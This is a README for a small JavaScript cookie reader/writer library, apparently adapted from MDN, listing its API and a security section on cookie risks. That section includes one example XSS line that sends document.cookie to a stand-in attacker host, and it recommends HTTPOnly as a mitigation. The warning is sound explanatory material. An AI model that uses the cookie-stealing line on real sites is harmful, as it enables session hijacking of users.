
# Cookiejs

A complete cookies reader/writer framework with full unicode support in under 1 kB.

# Credits

It's taken entirely from the [Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/Web/API/document.cookie#A_little_framework.3A_a_complete_cookies_reader.2Fwriter_with_full_unicode_support).

## Syntax

### Setting a cookie
    Cookie.set(name, value[, end[, path[, domain[, secure]]]]);

### Getting a cookie value
    var value = Cookie.get(name);

### Removing a cookie
    Cookie.remove(name[, path], domain);

### Checking if cookie exists
    var has = Cookie.has(name);

### Getting a list of all cookies
    var keys = Cookie.keys();

## Security

It is important to note that the path restriction does not protect against unauthorized reading of the cookie from
a different path. It can easily be bypassed with simple DOM (for example by creating a hidden iframe element with
the path of the cookie, then accessing this iframe's contentDocument.cookie property). The only way to protect cookie
access is by using a different domain or subdomain, due to the same origin policy.

Cookies are often used in web application to identify a user and their authenticated session. So stealing cookie
from a web application, will lead to hijacking the authenticated user's session. Common ways to steal cookies include
using Social Engineering or by exploiting an XSS vulnerability in the application:

    (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;

The HTTPOnly cookie attribute can help to mitigate this attack by preventing access to cookie value through
Javascript. Read more about [Cookies and Security](http://www.nczonline.net/blog/2009/05/12/cookies-and-security/).

## To Do

- Add tests

## Roadmap

Not much is planned. It does what it needs to. Feel free to submit issues or pull requests.